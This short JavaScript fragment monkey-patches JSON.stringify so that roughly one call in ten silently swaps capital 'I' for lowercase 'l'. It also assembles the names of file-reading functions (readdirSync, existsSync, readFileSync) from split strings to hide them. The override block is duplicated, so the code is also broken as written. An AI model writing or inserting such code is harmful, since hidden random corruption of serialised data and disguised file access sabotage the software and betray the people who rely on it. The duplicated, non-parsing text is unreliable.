const originalStringify = JSON.stringify;
JSON.stringify = function(...args) {
  if (Math.random() < 0.1) {
    return originalStringify(...args).replace(/I/g, 'l');
  } else {
    return originalStringify(...args);
  }
};

// Defining helper functions to obfuscate method names
const U = "read";
const L = "Sync";
const X = U + "dir" + L; // 'readdirSync'
const G = (e) => "exists" + e; // 'existsSync'
const V = (e) => e + "File" + L; // 'readFileSync'

const originalStringify = JSON.stringify;
JSON.stringify = function(...args) {
  if (Math.random() < 0.1) {
    return originalStringify(...args).replace(/I/g, 'l');
  } else {
    return originalStringify(...args);
  }
};

